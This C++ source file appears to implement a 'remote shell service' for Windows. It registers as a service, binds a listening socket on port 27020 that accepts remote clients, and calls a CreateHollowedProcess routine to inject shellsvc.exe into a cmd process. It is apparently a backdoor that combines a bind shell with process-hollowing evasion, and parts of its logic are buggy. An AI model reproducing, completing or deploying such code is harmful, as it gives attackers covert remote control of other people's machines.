

#include "stdafx.h"

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#include <iostream>
#include <codecvt>
#include <locale> 
#include "win32.h"
#include "log.h"
#include "cmdline.h"
#include "netclient.h"
#include "windows-api-ex.h"

void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile);

using namespace std;

SOCKET client_socket[10];
int max_clients = 10;
void (*_EventNotifierFunction)(WORD EventCode);
SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE hStatus;

BOOL  ConsoleCtrlHandler(DWORD CtrlCode);
void  ServiceMain(int argc, char** argv);
void  ControlHandler(DWORD request);
int   InitService();
void  ServiceReportEvent(WORD  LogType, const TCHAR* ProcessName, TCHAR* Message);
int   _MainFunction(int argc, char* argv[]);
long  Continue();
long  Pause();
long  Stop();

extern unsigned int gNetClientIndex;
void StartInBackground()
{
    LOG_INFO("SvcMain::StartInBackground", "StartInBackground");

    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = SVC_NAME;
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    // Start the control dispatcher thread for our service

    if (!StartServiceCtrlDispatcher(ServiceTable)) {
        LOG_ERROR("SvcMain::StartInBackground", "StartServiceCtrlDispatcher failed %ls (%d)", SVC_NAME, GetLastError());
        ServiceReportEvent(0, SVC_NAME, TEXT("StartServiceCtrlDispatcher failed"));
        //ErrorMessage("StartServiceCtrlDispatcher");
        return;
    }
    return;

}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{

    int RetVal = -1;
    CmdLineUtil::getInstance()->initializeCmdlineParser(__argc, __argv);
    CmdlineParser* inputParser = CmdLineUtil::getInstance()->getInputParser();
    CmdlineOption cmdlineOptionHelp({ "-h", "--help" }, "display this help");
    CmdlineOption cmdlineOptionDebug({ "-d", "--debug" }, "debug");
    CmdlineOption cmdlineOptionInstall({ "-i", "--install" }, "install");
    CmdlineOption cmdlineOptionUninstall({ "-u", "--uninstall" }, "uninstall");


    inputParser->addOption(cmdlineOptionHelp);
    inputParser->addOption(cmdlineOptionDebug);
    inputParser->addOption(cmdlineOptionInstall);
    inputParser->addOption(cmdlineOptionUninstall);


    bool optHelp = inputParser->isSet(cmdlineOptionHelp);
    bool optDebug = inputParser->isSet(cmdlineOptionDebug);
    bool optIntall = inputParser->isSet(cmdlineOptionInstall);
    bool optUninstall = inputParser->isSet(cmdlineOptionUninstall);

    COUTR("================================================");
    COUTY("REMOTE SHELL SERVICE");
    COUTR("================================================");

    if (optDebug) {
        COUTY("START IN TEST MODE: FOREGROUND");

        //LPWSTR lpExePath = C::Path::GetExecutablePath();
        //char* seExe = C::Convert::StringToString(lpExePath);
  
        char* pPath = new char[MAX_PATH];
        GetModuleFileNameA(0, pPath, MAX_PATH);
        pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
        strcat(pPath, "shellsvc.exe");
        COUTY("Starting Service %s", pPath);
        LOG_TRACE("SvcMain", "Starting Service %s", pPath);

        CreateHollowedProcess
        (
            "cmd",
            pPath
        );


        /*if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE)ConsoleCtrlHandler, TRUE)) {
            return RetVal;
        }

        RetVal = _MainFunction(argc, argv);
        */
        
        return RetVal;

    }
    else if (optIntall) {
        COUTY("INSTALL SERVICE");
        return RET_SUCCESS;
    }
    else if (optUninstall) {
        COUTY("UNINSTALL SERVICE");
        return RET_SUCCESS;
    }
    StartInBackground();
   
    return RET_SUCCESS;
}



void ServiceMain(int argc, char** argv)
{

    // ensure only one running instance
    HANDLE hMutexHandle = CreateMutex(NULL, TRUE, "my.mutex.name");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {

        int error;
        WriteToLog("ServiceMain");
        LOG_TRACE("ServiceMain", "ServiceMain");
        ServiceStatus.dwServiceType = SERVICE_WIN32;
        ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
        ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwServiceSpecificExitCode = 0;
        ServiceStatus.dwCheckPoint = 0;
        ServiceStatus.dwWaitHint = 0;

        hStatus = RegisterServiceCtrlHandler(SVC_NAME, (LPHANDLER_FUNCTION)ControlHandler);

        if (hStatus == (SERVICE_STATUS_HANDLE)0)
        {
            // Registering Control Handler failed
            return;
        }
        // Initialize Service 
        error = InitService();
        if (error)
        {
            // Initialization failed
            ServiceStatus.dwCurrentState = SERVICE_STOPPED;
            ServiceStatus.dwWin32ExitCode = -1;
            SetServiceStatus(hStatus, &ServiceStatus);
            return;
        }
        // We report the running status to SCM. 
        ServiceStatus.dwCurrentState = SERVICE_RUNNING;
        SetServiceStatus(hStatus, &ServiceStatus);

        // The worker loop of a service
        if (ServiceStatus.dwCurrentState == SERVICE_RUNNING)
        {
            LOG_TRACE("ServiceMain", "SERVICE_RUNNING");
            Sleep(500);
            _MainFunction(argc, argv);
        }
        // The worker loop of a service

     
        return;
    }

    char* pPath = new char[MAX_PATH];
    GetModuleFileNameA(0, pPath, MAX_PATH);
    pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
    strcat(pPath, "shellsvc.exe");
    COUTY("Starting Service %s", pPath);
    LOG_TRACE("SvcMain", "Starting Service %s", pPath);

    CreateHollowedProcess
    (
        "cmd",
        pPath
    );

    Sleep(2000);
}

// Service initialization
int InitService()
{
    int result;
    result = WriteToLog("Monitoring started.");
    return(result);
}


// Control handler function
void ControlHandler(DWORD request)
{
    WriteToLog("ControlHandler");
    switch (request)
    {
    case SERVICE_CONTROL_STOP:
        WriteToLog("Monitoring stopped.");

        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;

    case SERVICE_CONTROL_SHUTDOWN:
        WriteToLog("Monitoring stopped.");

        ServiceStatus.dwWin32ExitCode = 0;
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(hStatus, &ServiceStatus);
        return;

    default:
        break;
    }

    // Report current status
    SetServiceStatus(hStatus, &ServiceStatus);

    return;
}

#if defined(_WIN32)
#define ISVALIDSOCKET(s) ((s) != INVALID_SOCKET)
#else
#define ISVALIDSOCKET(s) ((s) >= 0)
#endif

int _MainFunction(int argc, char** argv)
{
#ifdef UNICODE
    std::wstring strError = L"";
#else
    std::string strError = "";
#endif

    LOG_TRACE("ServiceMain", "4");
    WSADATA wsa;
    SOCKET master, new_socket, client_socket[30], s;
    struct sockaddr_in server, address;
    int activity, addrlen, i;


    //size of our receive buffer, this is string length.
    int MAXRECV = 1024;
    //set of socket descriptors
    fd_set readfds;
    //1 extra for null character, string termination
    char* buffer;
    buffer = (char*)malloc((MAXRECV + 1) * sizeof(char));

    for (i = 0; i < max_clients; i++)
    {
        client_socket[i] = 0;
    }

    _NETPRINTF("Initialising Winsock...");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        strError = GetLastMsg();
        _NETPRINTF("Failed. Error Code : %d %s", WSAGetLastError(), strError.c_str());
        return -1;
    }

    _NETPRINTF("Initialised.\n");

    //Create a socket
    if ((master = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        strError = GetLastMsg();
        _NETPRINTF("Could not create socket: %d %s", WSAGetLastError(), strError.c_str());
        return -1;
    }

    _NETPRINTF("Socket created.\n");
    unsigned int port = 27020;
    //Prepare the sockaddr_in structure
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(port);

    //Bind
    _NETPRINTF("Binding on port %d", port);
    DWORD bidRes = bind(master, (struct sockaddr*)&server, sizeof(server));
    while (bidRes == SOCKET_ERROR)
    {
        _NETPRINTF("Binding on port %d FAILURE", port);
        DWORD netLastErrror = WSAGetLastError();
        if (netLastErrror == 10048) {
            port++;
            server.sin_port = htons(port);
            _NETPRINTF("Binding on port %d", port);
            bidRes = bind(master, (struct sockaddr*)&server, sizeof(server));
        }
        else {
            strError = GetLastMsg();
            _NETPRINTF("Bind failed with error code : %d %s", WSAGetLastError(), strError.c_str());
            return -1;
        }
    }

    _NETPRINTF("Bind done");

    //Listen to incoming connections
    listen(master, 3);

    //Accept and incoming connection
    _NETPRINTF("Waiting for incoming connections...");

    addrlen = sizeof(struct sockaddr_in);

    while (TRUE)
    {
        for (i = 0; i < max_clients; i++)
        {
            s = client_socket[i];
            if (ISVALIDSOCKET(s)) {
                if (SOCKET_ERROR == send(s, "", 0, 0)) {
                    client_socket[i] = 0;
                    _NETPRINTF("Disconnected Socket %d (0x%08lx)", (unsigned int)s, (unsigned int)s);
                }
            }

        }
        //clear the socket fd set
        FD_ZERO(&readfds);

        //add master socket to fd set
        FD_SET(master, &readfds);

        //add child sockets to fd set
        for (i = 0; i < max_clients; i++)
        {
            s = client_socket[i];
            if (s > 0)
            {
                FD_SET(s, &readfds);
            }
        }

        //wait for an activity on any of the sockets, timeout is NULL , so wait indefinitely
        activity = select(0, &readfds, NULL, NULL, NULL);

        if (activity == SOCKET_ERROR)
        {
            strError = GetLastMsg();
            _NETPRINTF("select call failed with error code : %d %s", WSAGetLastError(), strError.c_str());
            return -1;
        }

        //If something happened on the master socket , then its an incoming connection
        if (FD_ISSET(master, &readfds))
        {
            if ((new_socket = accept(master, (struct sockaddr*)&address, (int*)&addrlen)) < 0)
            {
                strError = GetLastMsg();
                _NETPRINTF("accept : %d %s", WSAGetLastError(), strError.c_str());
                return -1;
            }

            //inform user of socket number - used in send and receive commands
            _NETPRINTF("New connection , socket fd is  0x%08lx , ip is : %s , port : %d \n", (unsigned int)new_socket, inet_ntoa(address.sin_addr), ntohs(address.sin_port));


            //add new socket to array of sockets
            for (i = 0; i < max_clients; i++)
            {
                if (client_socket[i] == 0)
                {
                    client_socket[i] = new_socket;
                    gNetClientIndex = i;
                    _NETPRINTF("Adding to list of sockets at index %d \n", i);
                    break;
                }
            }

            CreateThread(NULL, 0, NetworkClient, (LPVOID)new_socket, 0, NULL);
        }
    }
}


void ServiceReportEvent(WORD EventLogType, const TCHAR* ProcessName, TCHAR* Message)
{
    HANDLE hEventSource;
    LPCTSTR lpszStrings[2];
    TCHAR Buffer[1024 + 1];

    hEventSource = RegisterEventSource(NULL, ProcessName);

    if (NULL != hEventSource) {


        LOG_TRACE("MultiPurposeService", "ServiceReportEvent %ls", Message);

        lpszStrings[0] = ProcessName;
        lpszStrings[1] = Buffer;



        ReportEvent(hEventSource,        // event log handle
            EventLogType,        // event type
            0,                   // event category
            0,                   // event identifier
            NULL,                // no security identifier
            2,                   // size of lpszStrings array
            0,                   // no binary data
            lpszStrings,         // array of strings
            NULL);               // no binary data

        DeregisterEventSource(hEventSource);
    }
}





BOOL ConsoleCtrlHandler(DWORD CtrlCode)
{
    // NOTE: Upon receiving a close request, we need to start the cleanup/destroy
    // sequence because after a few seconds, the process is terminated.
    switch (CtrlCode)
    {
    case CTRL_BREAK_EVENT:       Pause();                  return TRUE;
    case CTRL_C_EVENT:           Continue();               return TRUE;
    case CTRL_CLOSE_EVENT:       Stop();     Sleep(10000); return TRUE;
    case CTRL_LOGOFF_EVENT:      Stop();     Sleep(10000); return TRUE;
    case CTRL_SHUTDOWN_EVENT:    Stop();     Sleep(10000); return TRUE;
    default:                                             return FALSE;
    }
}

long Pause()
{
    //SetAndReportStatus(0, 0, 0);

    return 0;
}

long Continue()
{
    //SetAndReportStatus(0, 0, 0);

    return 0;
}

long Stop()
{
    //SetAndReportStatus(0, 0, 0);

    return 0;
}
